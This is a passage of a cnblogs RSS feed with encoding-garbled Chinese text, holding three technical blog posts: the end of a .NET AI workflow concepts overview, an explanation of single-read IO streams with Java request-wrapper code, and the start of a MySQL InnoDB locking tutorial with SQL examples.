</tr>
<tr>
<td>ð ä¹¦ç­¾</td>
<td>æ è®°éè¯»è¿åº¦ï¼ä¸æ¬¡ä»è¿éç»§ç»­</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/fe1a85bc-369c-4ab7-9817-44e56a910cb2.png" alt="" loading="lazy"></p>
<h2 id="-checkpoint-çæ ¸å¿ä¿¡æ¯">ð Checkpoint çæ ¸å¿ä¿¡æ¯</h2>
<pre><code class="language-csharp">// æ¥èª CheckpointInfo.cs
public sealed class CheckpointInfo
{
    // è¿è¡å®ä¾çå¯ä¸æ è¯ç¬¦
    public string RunId { get; }
    
    // æ£æ¥ç¹çå¯ä¸æ è¯ç¬¦
    public string CheckpointId { get; }
}

// æ£æ¥ç¹çå®æ´æ°æ®ï¼æ¥èª Checkpoint.csï¼
internal sealed class Checkpoint
{
    public int StepNumber { get; }                                    // è¶æ­¥ç¼å·
    public WorkflowInfo Workflow { get; }                             // å·¥ä½æµä¿¡æ¯
    public RunnerStateData RunnerData { get; }                        // è¿è¡å¨ç¶æ
    public Dictionary&lt;ScopeKey, PortableValue&gt; StateData { get; }     // ç¶ææ°æ®
    public Dictionary&lt;EdgeId, PortableValue&gt; EdgeStateData { get; }   // è¾¹ç¶ææ°æ®
    public CheckpointInfo? Parent { get; }                            // ç¶æ£æ¥ç¹
}
</code></pre>
<h2 id="-checkpoint-çä½¿ç¨åºæ¯">ð Checkpoint çä½¿ç¨åºæ¯</h2>
<table>
<thead>
<tr>
<th>åºæ¯</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>æéæ¢å¤</strong></td>
<td>ç³»ç»å´©æºåä»æè¿çæ£æ¥ç¹æ¢å¤</td>
</tr>
<tr>
<td><strong>é¿æ¶é´è¿è¡</strong></td>
<td>åæ®µæ§è¡ï¼æ¯æ®µç»æä¿å­è¿åº¦</td>
</tr>
<tr>
<td><strong>äººæºäº¤äº</strong></td>
<td>ç­å¾ç¨æ·è¾å¥æ¶ä¿å­ç¶æ</td>
</tr>
<tr>
<td><strong>è°è¯åæ¾</strong></td>
<td>ä»ä»»ææ£æ¥ç¹éæ°æ§è¡</td>
</tr>
<tr>
<td><strong>çæ¬åæ¯</strong></td>
<td>ä»åä¸ä¸ªæ£æ¥ç¹åå»ºå¤ä¸ªåæ¯æ§è¡</td>
</tr>
</tbody>
</table>
<p><img src="https://files.mdnice.com/user/3327/a738e6f3-a6ed-457d-ac84-5774a33963be.png" alt="" loading="lazy"></p>
<hr>
<h1 id="ä¹æ ¸å¿æ¦å¿µå³ç³»å¾">ä¹ãæ ¸å¿æ¦å¿µå³ç³»å¾</h1>
<h2 id="-æ¦å¿µä¹é´çå³ç³»">ð æ¦å¿µä¹é´çå³ç³»</h2>
<p>è®©æä»¬ææææ ¸å¿æ¦å¿µèç³»èµ·æ¥ï¼ççå®ä»¬æ¯å¦ä½åä½çï¼</p>
<p><img src="https://files.mdnice.com/user/3327/7f1a8fae-382d-46ac-b410-b4143a4b3080.png" alt="" loading="lazy"></p>
<h2 id="-çå½å¨æè§è§">ð çå½å¨æè§è§</h2>
<p>ä»å·¥ä½æµçå®æ´çå½å¨ææ¥çï¼</p>
<p><img src="https://files.mdnice.com/user/3327/23190ea8-91bc-4424-8d4e-7831777b4c59.png" alt="" loading="lazy"></p>
<h2 id="-æ¶æ¯æµè§è§">ð æ¶æ¯æµè§è§</h2>
<p>ä»æ¶æ¯å¨å·¥ä½æµä¸­çæµå¨æ¥çï¼</p>
<p><img src="https://files.mdnice.com/user/3327/cb1e4135-d345-461b-bfcc-8da838c2f242.png" alt="" loading="lazy"></p>
<p><strong>å³é®çè§£</strong>ï¼</p>
<ol>
<li><strong>æ¶æ¯é©±å¨</strong>ï¼Executor ä¹é´éè¿æ¶æ¯ä¼ éæ°æ®</li>
<li><strong>å¼æ­¥æ¹å¤ç</strong>ï¼åä¸ SuperStep åç Executor å¯ä»¥å¹¶è¡æ§è¡</li>
<li><strong>è¾¹æ§å¶æµå</strong>ï¼Edge å³å®æ¶æ¯ä»åªéå°åªé</li>
<li><strong>ç¶æéç¦»</strong>ï¼æ¯ä¸ª SuperStep ç»ææ¶åºç¨ç¶ææ´æ°</li>
</ol>
<hr>
<h1 id="åå®éåºç¨ç¤ºä¾">åãå®éåºç¨ç¤ºä¾</h1>
<h2 id="-åºæ¯çµåè®¢åå¤çå·¥ä½æµ">ð åºæ¯ï¼çµåè®¢åå¤çå·¥ä½æµ</h2>
<p>è®©æä»¬éè¿ä¸ä¸ªå®éåºæ¯æ¥çè§£è¿äºæ¦å¿µçåºç¨ï¼</p>
<p><img src="https://files.mdnice.com/user/3327/cf7cb742-6088-4658-a99e-b2dff3e886e9.png" alt="" loading="lazy"></p>
<h2 id="-æ¦å¿µå¯¹åºå³ç³»">ð æ¦å¿µå¯¹åºå³ç³»</h2>
<table>
<thead>
<tr>
<th>æ¦å¿µ</th>
<th>å¨æ­¤åºæ¯ä¸­çä½ç°</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Workflow</strong></td>
<td>æ´ä¸ªè®¢åå¤çæµç¨</td>
</tr>
<tr>
<td><strong>Executor</strong></td>
<td>æ¯ä¸ªå¤çæ­¥éª¤ï¼æ¥æ¶ãéªè¯ãæ¯ä»ç­ï¼</td>
</tr>
<tr>
<td><strong>Edge</strong></td>
<td>æ­¥éª¤ä¹é´çè¿æ¥ï¼å«æ¡ä»¶å¤æ­ï¼</td>
</tr>
<tr>
<td><strong>SuperStep</strong></td>
<td>æ¯ä¸è½®å¤çï¼å¦ï¼è¶æ­¥1å¤çæ¥æ¶ï¼è¶æ­¥2å¤çéªè¯...ï¼</td>
</tr>
<tr>
<td><strong>WorkflowContext</strong></td>
<td>æä¾è®¢åç¶æè¯»åãæ¶æ¯åéè½å</td>
</tr>
<tr>
<td><strong>WorkflowEvent</strong></td>
<td>æ¯ä¸ªæ­¥éª¤çå¼å§/å®æ/å¤±è´¥äºä»¶</td>
</tr>
<tr>
<td><strong>Run</strong></td>
<td>ä¸ä¸ªå·ä½è®¢åçå¤çè¿ç¨</td>
</tr>
<tr>
<td><strong>Checkpoint</strong></td>
<td>å¤çä¸­éä¿å­çç¶æï¼å¦æ¯ä»å®æåä¿å­ï¼</td>
</tr>
</tbody>
</table>
<h2 id="-åºæ¯å¤æºè½ä½åä½å·¥ä½æµ">ð¤ åºæ¯ï¼å¤æºè½ä½åä½å·¥ä½æµ</h2>
<p>å¨ AI Agent åºæ¯ä¸­ï¼Workflow å¯ä»¥ç¨æ¥ç¼æå¤ä¸ª Agent çåä½ï¼</p>
<p><img src="https://files.mdnice.com/user/3327/22fb1f31-f863-44ad-97f0-69ab7fae6afc.png" alt="" loading="lazy"></p>
<p><strong>Workflow çä¼å¿</strong>ï¼</p>
<table>
<thead>
<tr>
<th>ä¼å¿</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>ð <strong>çµæ´»ç¼æ</strong></td>
<td>å¯ä»¥è½»æ¾è°æ´ Agent ä¹é´çåä½å³ç³»</td>
</tr>
<tr>
<td>ð¾ <strong>ç¶æç®¡ç</strong></td>
<td>èªå¨ç®¡çå Agent çç¶æåä¸ä¸æ</td>
</tr>
<tr>
<td>â¸ï¸ <strong>å¯ä¸­æ­/æ¢å¤</strong></td>
<td>æ¯æäººæºäº¤äºï¼éæ¶æååæ¢å¤</td>
</tr>
<tr>
<td>ð <strong>å¯è§æµæ§</strong></td>
<td>éè¿äºä»¶è¿½è¸ªæ´ä¸ªæ§è¡è¿ç¨</td>
</tr>
<tr>
<td>ð¡ï¸ <strong>å®¹éè½å</strong></td>
<td>éè¿æ£æ¥ç¹æ¯ææéæ¢å¤</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="åä¸æ¦å¿µæ»ç»">åä¸ãæ¦å¿µæ»ç»</h1>
<h2 id="-æ ¸å¿æ¦å¿µéæ¥è¡¨">ð æ ¸å¿æ¦å¿µéæ¥è¡¨</h2>
<table>
<thead>
<tr>
<th>æ¦å¿µ</th>
<th>å®ä¹</th>
<th>å³é®ç±»</th>
<th>æ ¸å¿èè´£</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Executor</strong></td>
<td>æ§è¡å¨/å¤çèç¹</td>
<td><code>Executor</code>, <code>Executor&lt;T&gt;</code>, <code>FunctionExecutor&lt;T&gt;</code></td>
<td>å¤çæ¶æ¯ï¼äº§çè¾åº</td>
</tr>
<tr>
<td><strong>Edge</strong></td>
<td>è¿æ¥è¾¹</td>
<td><code>Edge</code>, <code>EdgeData</code>, <code>DirectEdgeData</code></td>
<td>å®ä¹æ¶æ¯æµååæ¡ä»¶</td>
</tr>
<tr>
<td><strong>Workflow</strong></td>
<td>å·¥ä½æµå®ä¹</td>
<td><code>Workflow</code>, <code>WorkflowBuilder</code></td>
<td>ç»ç» Executor å Edge</td>
</tr>
<tr>
<td><strong>SuperStep</strong></td>
<td>è¶æ­¥/æ¹éå¤çå¨æ</td>
<td><code>SuperStepEvent</code>, <code>SuperStepStartedEvent</code></td>
<td>æ¹éå¤çæ¶æ¯</td>
</tr>
<tr>
<td><strong>WorkflowContext</strong></td>
<td>å·¥ä½æµä¸ä¸æ</td>
<td><code>IWorkflowContext</code></td>
<td>æä¾è¿è¡æ¶æå¡</td>
</tr>
<tr>
<td><strong>WorkflowEvent</strong></td>
<td>å·¥ä½æµäºä»¶</td>
<td><code>WorkflowEvent</code>, <code>ExecutorEvent</code></td>
<td>éç¥æ§è¡ç¶æ</td>
</tr>
<tr>
<td><strong>Run</strong></td>
<td>è¿è¡å®ä¾</td>
<td><code>Run</code>, <code>RunStatus</code></td>
<td>ç®¡çä¸æ¬¡æ§è¡</td>
</tr>
<tr>
<td><strong>Checkpoint</strong></td>
<td>æ£æ¥ç¹</td>
<td><code>CheckpointInfo</code>, <code>ICheckpointStore</code></td>
<td>ä¿å­åæ¢å¤ç¶æ</td>
</tr>
</tbody>
</table>
<h2 id="-è®°å¿å£è¯">ð è®°å¿å£è¯</h2>
<blockquote>
<p><strong>"å·¥ä½æµç¨è¾¹è¿æ¥ï¼æ§è¡å¨æ¥åå¤ç"</strong><br>
<strong>"è¶æ­¥æ¹éå¾åèµ°ï¼ä¸ä¸æä¸­è¯»åæ"</strong><br>
<strong>"äºä»¶éç¥å¨è¿ç¨ï¼è¿è¡å®ä¾è·ä¸æ¬¡"</strong><br>
<strong>"æ£æ¥ç¹æ¥å­è¿åº¦ï¼éæ¶æ¢å¤ä¸ææ"</strong></p>
</blockquote>

</div>
<div id="MySignature" role="contentinfo">
    <div style="display: block; border: 2px solid #6ecaa8; padding: 10px; background: aliceblue">  
<img src="https://files.cnblogs.com/files/sheng-jie/maf-course-card-scan.bmp">
<blockquote>
<b>ðé¢å.NETå¼åèçAI Agent å¼åè¯¾ç¨ã.NET+AI | æºè½ä½å¼åè¿é¶ãå·²ä¸çº¿ï¼æ¬¢è¿æ«ç å å¥å­¦ä¹ ãð</b>
</blockquote>
</div>

<img src="https://files.cnblogs.com/files/sheng-jie/scan-follow.bmp">
<blockquote>
<b>
å³æ³¨æçå¬ä¼å·ãå AI èè¡ãï¼æä»¬å¾®ä¿¡ä¸è§ä¸æ£ã
<br>
éç½¢æ­¤æï¼å¦ææ¨è§å¾æ¬æä¸éå¹¶æææ¶è·ï¼è¯·ãæèµãæãæ¨èãï¼ä¹å¯ãè¯è®ºãçä¸æ¨çé®é¢æå»ºè®®ä¸æäº¤æµã

ä½ çæ¯ææ¯æä¸æ­åä½ååäº«çä¸ç«­å¨åï¼</b>
</blockquote>

<div style="display: block; border: 2px solid #6ecaa8; padding: 10px; background: aliceblue" id="AllanboltSignature">    
        <div>ä½èï¼<a href="http://www.jianshu.com/u/39ec0e6b1844" target="_blank">ãå£æ°ã</a></div>
        <div>åºå¤ï¼<a href="http://www.cnblogs.com/sheng-jie/" target="_blank">http://www.cnblogs.com/sheng-jie/</a></div>
        <div>æ¬æçæå½ä½èååå®¢å­å±æï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»ä¿çæ­¤æ®µå£°æï¼ä¸å¨æç« é¡µé¢ææ¾ä½ç½®ç»åºåæé¾æ¥ï¼å¦åä¿çè¿½ç©¶æ³å¾è´£ä»»çæå©ã</div>  
</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 20:34">2026-01-20 20:34</span>&nbsp;
<a href="https://www.cnblogs.com/sheng-jie">ãå£æ°ã</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508743);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508743', targetLink: 'https://www.cnblogs.com/sheng-jie/p/19508743', title: '.NET+AI | Workflow | æ ¸å¿æ¦å¿µééï¼1ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸ºä»ä¹ IO æµéå¸¸åªè½è¢«è¯»åä¸æ¬¡ ]]></title>
    <link>https://www.cnblogs.com/yanshajiuzhou/p/19508716</link>
    <guid>8d3025a7d271c46f648b13878349879c</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/yanshajiuzhou/p/19508716" title="åå¸äº 2026-01-20 20:22">
    <span role="heading" aria-level="2">ä¸ºä»ä¹ IO æµéå¸¸åªè½è¢«è¯»åä¸æ¬¡</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        IO æµåªè½è¯»åä¸æ¬¡ï¼æ¯ ç²¾å¿è®¾è®¡çï¼è´´åæä½ç³»ç»æä»¶ / ç½ç» IO ç "é¡ºåºæ¶è´¹"&nbsp;ç¹æ§ï¼ä¿æååºå±ç³»ç»çä¸è´æ§ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p>ä»å¤©æä»¬æ¥ä¸èµ·æ¢è®¨ä¸&nbsp;ä¸ºä»ä¹<strong> IO æµ</strong>éå¸¸åªè½è¢«è¯»åä¸æ¬¡ï¼</p>
<p>æä¸ºä»ä¹ä¼ååºè¿ä¸ªçé®å¢ï¼æ¯å ä¸ºæç ç©¶Webå¼åä¸­çä¸ä¸ªé®é¢æ¶ï¼HTTPè¯·æ±ä½å¨ <strong>Filterï¼è¿æ»¤å¨ï¼</strong>å¤è¢«è¯»åäºä¹åï¼å¨ Controllerï¼æ§å¶å±ï¼å°±è¯»ä¸å°å¼äºï¼ä½¿ç¨ @RequestBody çæ¶åã</p>
<p>æ è®ºæ¯å­èæµï¼InputStream / OutputStreamï¼è¿æ¯å­ç¬¦æµï¼Reader / Writerï¼ï¼ææåºäºæµçè¯»åæä½é½ä¼ç»´æ¤ä¸ä¸ª <strong>"ä½ç½®æé"</strong>ã</p>
<ul>
<li>åå§ç¶æä¸ï¼æéæåæµçèµ·å§ä½ç½®<strong>ï¼position = 0ï¼</strong>ï¼</li>
<li>æ¯æ¬¡è°ç¨ <strong>read() / read(byte[]) / read(char[])</strong> ç­è¯»åæ¹æ³æ¶ï¼æéä¼ååç§»å¨å¯¹åºå­èæ°ï¼</li>
<li>å½æéç§»å¨å°æµçæ«å°¾ï¼æ²¡ææ´å¤æ°æ®ï¼ï¼read() æ¹æ³ä¼è¿å <strong>-1</strong>ï¼è¡¨ç¤ºæµè¯»åå®æ¯ï¼</li>
<li>æéç§»å¨åä¸ä¼èªå¨åéï¼ä¹æ æ³ååç§»å¨ï¼é¤éæµæ¾å¼æ¯æéç½®ï¼ï¼å æ­¤åæ¬¡è¯»ååªè½å¾å° <strong>-1</strong>ã</li>
</ul>
<p><strong>ç±»æ¯</strong>ï¼<strong>IO æµ</strong>çè¯»åè¿ç¨ï¼å°±åç¨ <strong>ç£å¸¦æ­æ¾å¨å¬ç£å¸¦</strong> ââ ç£å¤´ï¼å¯¹åºæµçä½ç½®æéï¼ä»ç£å¸¦å¼å¤´ï¼æé 0ï¼å¼å§ç§»å¨ï¼æ¯è¯»ä¸ä¸ªå­è / å­ç¬¦ï¼ç£å¤´å°±å¾åèµ°ä¸æ­¥ï¼å½ç£å¤´èµ°å°ç£å¸¦æ«å°¾ï¼åç»§ç»­æ­æ¾ï¼è¯»åï¼å°±åªè½å¬å° "æ²æ²å£°"ï¼æµè¿å <strong>-1</strong>ï¼ï¼å¹¶ä¸ç£å¤´ä¸ä¼èªå¨åå°å¼å¤´ã</p>
<p>å½ç¶ï¼<strong>ä¸æ¯æææµé½åªè½è¯»ä¸æ¬¡</strong>ï¼<strong>åºäºåå­çæµ</strong>ï¼å¦ <strong>ByteArrayInputStream / CharArrayReader</strong>ï¼æ¯æéç½®æéï¼å ä¸ºå®ä»¬çæ°æ®æºæ¯åå­ä¸­çæ°ç»ï¼<strong>æ°æ®ä¸ä¼æ¶å¤±</strong>ï¼ï¼å¯ä»¥éè¿ <strong>mark()</strong> å <strong>reset()&nbsp;</strong>æ¹æ³å°æé <strong>æ¢å¤</strong> å°æ è®°ä½ç½®ã</p>
<p>éè¦æ³¨æï¼</p>
<ul>
<li>è°ç¨ <strong>reset()&nbsp;</strong>åå¿é¡»åè°ç¨ <strong>mark(int readlimit)</strong>ï¼</li>
<li>ä¸æ¯æææµé½æ¯æ <strong>mark() / reset()</strong>ï¼å¯ä»¥éè¿ <strong>inputStream.markSupported()</strong> æ¥è¿è¡å¤æ­ã</li>
</ul>
<p><strong>ä½¿ç¨ mark() å reset() æ¹æ³ï¼</strong></p>
<pre class="language-java highlighter-hljs"><code>// ä»éç¨äºæ¯æmarkçæµ
public void processWithMark(InputStream input) throws IOException {
    if (!input.markSupported()) {
        throw new IOException("Mark not supported");
    }
    
    // æ è®°å½åä½ç½®ï¼åæ°100è¡¨ç¤ºæå¤å¯åé100å­è
    input.mark(100);
    
    // ç¬¬ä¸æ¬¡è¯»å
    byte[] firstRead = new byte[50];
    input.read(firstRead);
    System.out.println("First read: " + new String(firstRead));
    
    // éç½®å°æ è®°ä½ç½®
    input.reset();
    
    // ç¬¬äºæ¬¡è¯»åï¼ç¸ååå®¹ï¼
    byte[] secondRead = new byte[50];
    input.read(secondRead);
    System.out.println("Second read: " + new String(secondRead));
}</code></pre>
<p>ä½¿ç¨ <strong>åè£ç±»</strong> è§£å³ä¸ææä»¬æå°ç&nbsp;<strong>HTTPè¯·æ±ä½å¤æ¬¡è¯»å </strong>çé®é¢ï¼</p>
<pre class="language-java highlighter-hljs"><code>public class MyRequestWrapper extends HttpServletRequestWrapper {
    private final byte[] body; // ç¼å­è¯·æ±ä½çå­èæ°ç»

    public MyRequestWrapper(HttpServletRequest request) throws IOException {
        super(request);
        // å³é®æ­¥éª¤ï¼å¨æé æ¶ä¸æ¬¡æ§è¯»åå¹¶å­å¨åå§è¯·æ±æµ
        body = StreamUtils.copyToByteArray(request.getInputStream());
    }

    // æä¾ä¸ä¸ªä¾¿æ·æ¹æ³ï¼ç¨äºå¨è¿æ»¤å¨ä¸­è·åè¯·æ±ä½åå®¹ï¼ä¾å¦è®°å½æ¥å¿ï¼
    // ä½¿ç¨æ¶ï¼ç´æ¥è°ç¨ getBodyString() å³å¯
    public String getBodyString() throws UnsupportedEncodingException {
        return new String(body, this.getCharacterEncoding());
    }

    @Override
    public ServletInputStream getInputStream() throws IOException {
        // æ¯æ¬¡è°ç¨é½è¿åä¸ä¸ªåºäºç¼å­æ°æ®çæ°æµ
        ByteArrayInputStream bais = new ByteArrayInputStream(body);
        return new ServletInputStream() {
            @Override
            public int read() {
                return bais.read();
            }

            @Override
            public boolean isFinished() {
                return bais.available() == 0;
            }

            @Override
            public boolean isReady() {
                return true;
            }

            @Override
            public void setReadListener(ReadListener readListener) {
                // æ éå®ç°
            }
        };
    }

    @Override
    public BufferedReader getReader() throws IOException {
        return new BufferedReader(new InputStreamReader(this.getInputStream(), this.getCharacterEncoding()));
    }
}</code></pre>
<p>ç¶åå¨ <strong>è¿æ»¤å¨</strong> å¤åè£è¯·æ±ï¼</p>
<pre class="language-java highlighter-hljs"><code>@Slf4j
@Configuration
public class RequestCachingFilterConfig {

    @Bean
    public FilterRegistrationBean requestCachingFilter() {
        FilterRegistrationBean registrationBean = new FilterRegistrationBean();

        // æ ¸å¿ï¼åå»ºè¿æ»¤å¨ï¼åè£è¯·æ±ä¸º ContentCachingRequestWrapper
        registrationBean.setFilter(new OncePerRequestFilter() {
            @Override
            protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
                    throws ServletException, IOException {
                // 1. ä»åè£ HTTP è¯·æ±ï¼æé¤ WebSocket ç­ï¼
                if (request instanceof HttpServletRequest &amp;&amp; !(request instanceof ContentCachingRequestWrapper)) {
                    log.info("==========è¿å¥requestCachingFilter========");
                    // 2. åè£è¯·æ±ï¼èªå¨ç¼å­è¯·æ±ä½ï¼
                    MyRequestWrapper wrappedRequest = new MyRequestWrapper(request);
                    filterChain.doFilter(wrappedRequest, response); // ä¼ éåè£åçè¯·æ±
                } else {
                    filterChain.doFilter(request, response); // æ éåè£ï¼ç´æ¥æ¾è¡
                }
            }
        });

        // 3. éç½®æ¦æªææè¯·æ±ï¼å¯æ ¹æ®éæ±è°æ´ URL æ¨¡å¼ï¼
        registrationBean.addUrlPatterns("/*");
        registrationBean.setOrder(1); // ä¼åçº§æé«ï¼ç¡®ä¿åäºå¶ä»è¿æ»¤å¨æ§è¡
        registrationBean.setName("requestCachingFilter");
        return registrationBean;
    }
}</code></pre>
<p><strong>IO æµ</strong>åªè½è¯»åä¸æ¬¡ï¼æ¯ <strong>ç²¾å¿è®¾è®¡ç</strong>ï¼è´´åæä½ç³»ç»æä»¶ / ç½ç» IO ç <strong>"é¡ºåºæ¶è´¹"</strong>&nbsp;ç¹æ§ï¼ä¿æååºå±ç³»ç»çä¸è´æ§ã</p>
<p style="text-align: right"><span style="color: rgba(53, 152, 219, 1)">å¤å¨å½¢å¼è¶ç®åçä¸è¥¿ï¼æºæ§å«éè¶é«ï¼å ä¸ºå®å·²ç»ä¸åä¾èµå½¢å¼ï¼å¿é¡»ä¾é æºæ§ã-- çæ²ä¹æ´²</span></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 20:23">2026-01-20 20:22</span>&nbsp;
<a href="https://www.cnblogs.com/yanshajiuzhou">çæ²ä¹æ´²</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508716);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508716', targetLink: 'https://www.cnblogs.com/yanshajiuzhou/p/19508716', title: 'ä¸ºä»ä¹ IO æµéå¸¸åªè½è¢«è¯»åä¸æ¬¡' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ææ¯é¢ï¼MySQLç¯ï¼InnoDBçéæºå¶ï¼ ]]></title>
    <link>https://www.cnblogs.com/jimoer/p/19508695</link>
    <guid>6968b70ba9f7ca7b75e31befa91a3ceb</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jimoer/p/19508695" title="åå¸äº 2026-01-20 20:20">
    <span role="heading" aria-level="2">ææ¯é¢ï¼MySQLç¯ï¼InnoDBçéæºå¶ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/772743/202601/772743-20260120201934204-2046329064.png" alt="ææ¯é¢ï¼MySQLç¯ï¼InnoDBçéæºå¶ï¼" class="desc_img">
        å±äº«éãæä»éãæåéãè®°å½éãé´ééãä¸´é®éï¼Next Key Lockï¼ãæå¥æåéãAUTO-INCãæ²è§éãä¹è§é
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="mysqlçinnodbçéæºå¶">MySQLçInnoDBçéæºå¶</h2>
<p>MySQLçInnoDBå¼æä¸ï¼å¨éççº§å«ä¸ä¸è¬åä¸ºä¸¤ç§ï¼<strong>å±äº«éï¼Séï¼</strong>ã<strong>æä»éï¼Xéï¼</strong></p>
<h3 id="å±äº«é">å±äº«é</h3>
<p><strong><code>å±äº«éåç§°ä¸ºè¯»é</code></strong>ï¼<strong>æ¯è¯»åæä½æ¶åå»ºçéãå¶ä»ç¨æ·å¯ä»¥å¹¶åè¯»åæ°æ®ï¼ä½æ¯ä¸æ¦æè¡è¢«å ä¸å±äº«éï¼å¶ä»äºå¡ä»å¯ç»§ç»­å¯¹è¯¥è¡å å±äº«éï¼ä½ä»»ä½äºå¡è¥æ³å¯¹è¯¥è¡å æä»éï¼å³æ§è¡ <code>UPDATE</code>/<code>DELETE</code> ç­ï¼ï¼åå¿é¡»ç­å¾ææå±äº«ééæ¾</strong>ã</p>
<blockquote>
<p>ä¾å¦ï¼äºå¡T1å¯¹æ°æ®Açå ä¸å±äº«éï¼å¶ä»äºå¡åªè½å¯¹æ°æ®Aå å±äº«éï¼ä¸è½å æä»éãèå±äº«éçäºå¡åªè½è¯»åæ°æ®ï¼ä¸è½ä¿®æ¹æ°æ®ã</p>
</blockquote>
<p>å±äº«éçå éæ¹å¼å¦ä¸ï¼</p>
<pre><code class="language-sql">-- MySQL8.0ä¹åçæ¨èåæ³
SELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 LOCK IN SHARE MODE;

-- MySQL8.0ä»¥åä¹åçæ¨èåæ³
SELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 FOR SHARE;
</code></pre>
<p>å¨æ¥è¯¢è¯­å¥åé¢å¢å <code>LOCK IN SHARE MODE</code>ï¼ä¼å¯¹æ¥è¯¢èå´ä¸­çæ¯è¡é½å å±äº«éï¼è¿æ ·çæ°æ®è¡è¿å¯ä»¥è¢«å¶ä»äºå¡æåç³è¯·å±äº«éï¼ä½æ¯ä¸è½è¢«ç³è¯·æä»éã</p>
<h3 id="æä»é">æä»é</h3>
<p><strong><code>æä»éåç§°åé</code>ï¼è¥äºå¡T1å¯¹æ°æ®Aå ä¸æä»éä¹åï¼å¶ä»äºå¡åä¸è½åå¯¹æ°æ®Aå ä»»ä½ç±»åçéãèä¸æä»éçäºå¡æ¢å¯ä»¥è¯»æ°æ®åå¯ä»¥åæ°æ®ã</strong></p>
<p>æä»éçå éæ¹å¼ï¼</p>
<pre><code class="language-sql">SELECT ID,NAME FROM TABLE1 WHERE ID &gt;1 AND ID &lt;10 FOR UPDATE;
</code></pre>
<p>å¨æ¥è¯¢è¯­å¥åé¢å¢å <code>FOR UPDATE</code>ï¼ä¼å¯¹æ¥è¯¢å½ä¸­çæ¯æ¡è®°å½é½å æä»éï¼å½æ²¡æå¶ä»çº¿ç¨å¯¹æ¥è¯¢ç»æéä¸­çä»»ä½ä¸è¡ä½¿ç¨æä»éæ¶ï¼å¯ä»¥æåç³è¯·æä»éï¼å¦åä¼è¢«é»å¡ã</p>
<h3 id="å±äº«éåæä»éçæ»ç»">å±äº«éåæä»éçæ»ç»</h3>
<ul>
<li>å½ä¸è¡æ°æ®è·åäºæä»éï¼é£ä¹å¶ä»äºå¡å°±ä¸è½åå¯¹è¿ä¸è¡æ°æ®æ·»å <strong>å±äº«é</strong>æè<strong>æä»é</strong>ã</li>
<li>å½ä¸è¡æ°æ®è·åäºå±äº«éï¼é£ä¹å¶ä»äºå¡ä¾ç¶å¯ä»¥å¯¹è¿ä¸è¡æ°æ®æ·»å <strong>å±äº«é</strong>ï¼ä½ä¸è½æ·»å <strong>æä»é</strong>ã</li>
</ul>
<h4 id="ä½¿ç¨åºæ¯">ä½¿ç¨åºæ¯</h4>
<p>å±äº«é</p>
<ul>
<li><strong>è¯»-è¯»å¹¶åé«ä¸ä¸åè®¸âèè¯»âï¼ä¾å¦æ¥è¡¨ç»è®¡æ¶ï¼å¸æå«çäºå¡å¯ä»¥å¹¶åè¯»ï¼ä½ç¦æ­¢ä»»ä½äºå¡ä¿®æ¹è¿äºè¡ã</strong></li>
<li><strong>ç¶å­è¡¨ä¸è´æ§æ ¡éªï¼åå¯¹ç¶è¡¨ä¸»é® FOR SHAREï¼åè¯»å­è¡¨ï¼é²æ­¢ç¶è®°å½å¨æ­¤æé´è¢«å ã</strong></li>
</ul>
<p>æä»é</p>
<ul>
<li>è¯»-æ¹-åï¼Read-Modify-Writeï¼ï¼</li>
</ul>
<pre><code class="language-sql">SELECT balance FROM account WHERE id = 1 FOR UPDATE;
UPDATE account SET balance = balance - 100 WHERE id = 1;
</code></pre>
<p>é²æ­¢å¹¶åæ£æ¬¾åºç°è´ä½é¢ã</p>
<ul>
<li>æ²è§éå®ç°âç§æåºå­âï¼å FOR UPDATE æ£æ¥åºå­ &gt; 0ï¼å UPDATE ååºå­ã</li>
</ul>
<pre><code class="language-sql">-- å æä»éå¹¶è¯»åå½ååºå­
SELECT stock FROM merchandise WHERE id = 123 FOR UPDATE;

-- å¨åºç¨å±å¤æ­è¿åç stock å¼,è¥ stock &gt; 0ï¼åç»§ç»­ï¼å¦ååæ»å¹¶è¿åâå·²å®ç½â
